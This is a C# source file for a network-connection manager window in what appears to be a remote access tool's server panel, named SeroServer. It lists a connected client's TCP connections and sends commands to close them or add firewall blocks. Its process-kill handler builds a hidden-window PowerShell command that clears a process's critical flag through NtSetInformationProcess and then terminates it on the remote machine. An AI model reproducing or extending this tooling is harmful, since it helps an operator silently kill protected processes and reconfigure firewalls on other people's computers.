using System.Collections.ObjectModel;
using System.Windows;
using System.Windows.Input;
using DevExpress.Xpf.Core;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class TcpManagerWindow : ThemedWindow
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private readonly ObservableCollection<TcpEntryVM> _entries = [];

    public TcpManagerWindow(TlsServer server, string clientId, string clientLabel)
    {
        InitializeComponent();
        RubberBandSelector.Enable(GridTcp);
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text  = clientLabel;
        GridTcp.ItemsSource = _entries;

        _server.RegisterHandler(clientId, PacketType.TcpListResult,       OnTcpList);
        _server.RegisterHandler(clientId, PacketType.TcpFirewallRulesResult, OnFirewallResult);

        Lang.LanguageChanged += ApplyLanguage;
        ApplyLanguage();
        Closed += (_, _) =>
        {
            _server.UnregisterHandler(clientId, PacketType.TcpListResult);
            _server.UnregisterHandler(clientId, PacketType.TcpFirewallRulesResult);
            Lang.LanguageChanged -= ApplyLanguage;
        };
        Loaded += async (_, _) => { await Task.Delay(Random.Shared.Next(0, 250)); await Refresh(); };
    }

    private void ApplyLanguage()
    {
        Title = Lang.Get("FEAT_TCP_CONN");
        if (TxtBtnBlockIp   != null) TxtBtnBlockIp.Text   = Lang.Get("ACT_BLOCK_IP");
        if (TxtBtnBlockPort != null) TxtBtnBlockPort.Text = Lang.Get("ACT_BLOCK_PORT");
        if (MnuTcpClose      != null) MnuTcpClose.Header      = Lang.Get("ACT_CLOSE_CONN");
        if (MnuTcpKill       != null) MnuTcpKill.Header       = Lang.Get("ACT_KILL");
        if (MnuTcpCopyLocal  != null) MnuTcpCopyLocal.Header  = Lang.Get("ACT_COPY_LOCAL");
        if (MnuTcpCopyRemote != null) MnuTcpCopyRemote.Header = Lang.Get("ACT_COPY_REMOTE");
        if (ColTcpPid     != null) ColTcpPid.Header     = Lang.Get("PM_COL_PID");
        if (ColTcpProcess != null) ColTcpProcess.Header = Lang.Get("WIN_COL_PROCESS");
        if (ColTcpLocal   != null) ColTcpLocal.Header   = Lang.Get("TCP_COL_LOCAL");
        if (ColTcpRemote  != null) ColTcpRemote.Header  = Lang.Get("TCP_COL_REMOTE");
        if (ColTcpState   != null) ColTcpState.Header   = Lang.Get("WIN_COL_STATE");
    }

    private async Task Refresh()
    {
        TxtStatus.Text = Lang.Get("STATUS_REFRESHING");
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.TcpGetList });
    }

    private void OnTcpList(Packet pkt)
    {
        try
        {
            var data = JsonConvert.DeserializeObject<TcpListResultData>(pkt.Data);
            if (data == null) return;
            Dispatcher.BeginInvoke(() =>
            {
                _entries.Clear();
                foreach (var e in data.Entries)
                    _entries.Add(new TcpEntryVM(e.Pid, e.ProcessName, e.LocalAddr, e.RemoteAddr, e.State));
                TxtStatus.Text = $"{_entries.Count} connection(s) — {DateTime.Now:HH:mm:ss}";
            });
        }
        catch { }
    }

    private void OnFirewallResult(Packet pkt)
    {
        try
        {
            var data = JsonConvert.DeserializeObject<TcpFirewallRulesResultData>(pkt.Data);
            Dispatcher.BeginInvoke(() =>
            {
                if (data == null || data.Rules.Count == 0)
                    TxtStatus.Text = Lang.Get("TCP_FIREWALL_FAIL");
                else
                    TxtStatus.Text = $"Firewall: {data.Rules.Count} rule(s) applied — {string.Join(", ", data.Rules.Select(r => r.RuleName))}";
            });
        }
        catch { }
    }

    private async void Refresh_Click(object s, RoutedEventArgs e) => await Refresh();

    private async void CloseConn_Click(object s, RoutedEventArgs e)
    {
        var sel = GridTcp.SelectedItems.Cast<TcpEntryVM>().ToList();
        if (sel.Count == 0) return;
        string confirmMsg = sel.Count == 1
            ? $"Close TCP connection {sel[0].RemoteAddr} ({sel[0].ProcessName})?"
            : $"Close {sel.Count} TCP connections?";
        if (MessageBox.Show(confirmMsg, "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
        foreach (var row in sel)
        {
            var data = JsonConvert.SerializeObject(new TcpCloseData { LocalAddr = row.LocalAddr, RemoteAddr = row.RemoteAddr });
            await _server.SendToClient(_clientId, new Packet { Type = PacketType.TcpClose, Data = data });
        }
        ServerWindow.ReportGlobalActivity("Close TCP", sel.Count == 1 ? sel[0].RemoteAddr : $"{sel.Count} conns", "complete");
        ServerWindow.LogGlobal($"[TCP] Closed {(sel.Count == 1 ? $"TCP connection {sel[0].RemoteAddr} ({sel[0].ProcessName})" : $"{sel.Count} TCP connections")} on client {_clientId}.");
        await Task.Delay(300);
        await Refresh();
    }

    private async void KillProc_Click(object s, RoutedEventArgs e)
    {
        var sel = GridTcp.SelectedItems.Cast<TcpEntryVM>().Where(r => r.Pid > 0).ToList();
        if (sel.Count == 0) return;
        string confirmMsg = sel.Count == 1
            ? $"Kill '{sel[0].ProcessName}' (PID {sel[0].Pid})?"
            : $"Kill {sel.Count} processes?";
        if (MessageBox.Show(confirmMsg, "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
        foreach (var row in sel)
        {
            var cmd = $"powershell -NoP -NonI -W H -Command \"" +
                      $"Add-Type -TypeDefinition @'`n" +
                      $"using System.Runtime.InteropServices;`n" +
                      $"public class PK {{`n" +
                      $"[DllImport(\\\"ntdll.dll\\\")] public static extern int NtSetInformationProcess(System.IntPtr h,int c,ref uint v,int s);`n" +
                      $"[DllImport(\\\"kernel32.dll\\\",SetLastError=true)] public static extern System.IntPtr OpenProcess(uint a,bool i,int p);`n" +
                      $"[DllImport(\\\"kernel32.dll\\\")] public static extern bool TerminateProcess(System.IntPtr h,uint c);`n" +
                      $"[DllImport(\\\"kernel32.dll\\\")] public static extern bool CloseHandle(System.IntPtr h);`n" +
                      $"}}`n" +
                      $"'@ -ErrorAction SilentlyContinue;" +
                      $"$h=[PK]::OpenProcess(0x1FFFFF,$false,{row.Pid});" +
                      $"if($h -ne [IntPtr]::Zero){{$z=[uint32]0;[PK]::NtSetInformationProcess($h,0x1D,[ref]$z,4)|Out-Null;" +
                      $"[PK]::TerminateProcess($h,0)|Out-Null;[PK]::CloseHandle($h)|Out-Null}}\"";
            await _server.SendToClient(_clientId, new Packet { Type = PacketType.AutoTaskShell, Data = cmd });
        }
        TxtStatus.Text = sel.Count == 1 ? $"Kill sent → PID {sel[0].Pid} ({sel[0].ProcessName})" : $"Kill sent → {sel.Count} processes";
        ServerWindow.ReportGlobalActivity("Kill process", sel.Count == 1 ? sel[0].ProcessName : $"{sel.Count} processes", "complete");
        ServerWindow.LogGlobal($"[TCP] Killed process {(sel.Count == 1 ? $"'{sel[0].ProcessName}' (PID {sel[0].Pid})" : $"{sel.Count} processes")} via TCP manager on client {_clientId}.");
        await Task.Delay(600);
        await Refresh();
    }

    private async void BlockIp_Click(object s, RoutedEventArgs e)
    {
        var selected = GridTcp.SelectedItem as TcpEntryVM;
        string? defIp = selected?.RemoteAddr?.Split(':').FirstOrDefault();
        var ip = SimpleInput("Block remote IP in firewall (inbound + outbound):", defIp ?? "");
        if (string.IsNullOrWhiteSpace(ip)) return;
        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.TcpFirewallBlock,
            Data = JsonConvert.SerializeObject(new TcpFirewallBlockData { ProcessName = "", Port = 0, RemoteIp = ip, Direction = "both" })
        });
        TxtStatus.Text = $"🛡 Firewall block sent → IP {ip}";
        ServerWindow.ReportGlobalActivity("Firewall block IP", ip, "complete");
        ServerWindow.LogGlobal($"[TCP] Blocked remote IP {ip} in firewall on client {_clientId}.");
    }

    private async void BlockProcess_Click(object s, RoutedEventArgs e)
    {
        var selected = GridTcp.SelectedItem as TcpEntryVM;
        var name = SimpleInput("Block process (full path or name):", selected?.ProcessName ?? "");
        if (string.IsNullOrWhiteSpace(name)) return;
        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.TcpFirewallBlock,
            Data = JsonConvert.SerializeObject(new TcpFirewallBlockData { ProcessName = name, Port = 0, Direction = "both" })
        });
        TxtStatus.Text = $"Firewall block sent → {name} (in+out)";
        ServerWindow.ReportGlobalActivity("Firewall block proc", name, "complete");
        ServerWindow.LogGlobal($"[TCP] Blocked process '{name}' in firewall on client {_clientId}.");
    }

    private async void BlockPort_Click(object s, RoutedEventArgs e)
    {
        var selected = GridTcp.SelectedItem as TcpEntryVM;
        string? defPort = null;
        if (selected?.LocalAddr?.Contains(':') == true &&
            int.TryParse(selected.LocalAddr.Split(':').Last(), out _))
            defPort = selected.LocalAddr.Split(':').Last();

        var portStr = SimpleInput("Block port (TCP):", defPort ?? "");
        if (!int.TryParse(portStr, out int port) || port <= 0) return;
        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.TcpFirewallBlock,
            Data = JsonConvert.SerializeObject(new TcpFirewallBlockData { ProcessName = "", Port = port, Direction = "both" })
        });
        TxtStatus.Text = $"Firewall block sent → port {port} (in+out)";
        ServerWindow.ReportGlobalActivity("Firewall block port", port.ToString(), "complete");
        ServerWindow.LogGlobal($"[TCP] Blocked TCP port {port} in firewall on client {_clientId}.");
    }

    private string? SimpleInput(string prompt, string? def = null)
    {
        var dlg = new AddKeywordDialog(this, def ?? "", prompt);
        return dlg.ShowDialog() == true ? dlg.Keyword : null;
    }

    private void GridTcp_CopyLocal_Click(object s, RoutedEventArgs e)
    {
        if (GridTcp.SelectedItem is TcpEntryVM vm)
            try { System.Windows.Clipboard.SetText(vm.LocalAddr); TxtStatus.Text = $"Copied: {vm.LocalAddr}"; } catch { }
    }

    private void GridTcp_CopyRemote_Click(object s, RoutedEventArgs e)
    {
        if (GridTcp.SelectedItem is TcpEntryVM vm)
            try { System.Windows.Clipboard.SetText(vm.RemoteAddr); TxtStatus.Text = $"Copied: {vm.RemoteAddr}"; } catch { }
    }

    private void Close_Click(object s, RoutedEventArgs e) => Close();

    private void GridTcp_ContextMenuOpening(object sender, System.Windows.Controls.ContextMenuEventArgs e)
    {
        if (GridTcp.SelectedItems.Count == 0) e.Handled = true;
    }
}

public record TcpEntryVM(int Pid, string ProcessName, string LocalAddr, string RemoteAddr, string State);
